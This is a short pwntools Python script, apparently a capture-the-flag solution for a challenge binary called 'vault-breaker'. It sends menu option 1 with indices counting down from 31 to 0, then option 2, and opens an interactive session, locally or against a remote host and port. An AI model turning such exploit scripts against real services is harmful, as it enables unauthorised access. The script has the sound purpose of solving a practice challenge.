from pwn import *
import os 

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './vault-breaker'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

sh = start()

# exploit starts
# 0x1F == 31
for i in range(31, -1, -1):
    print('[INFO] Iter: ', i)
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', str(i))

sh.sendlineafter(b'>', b'2')

sh.interactive()
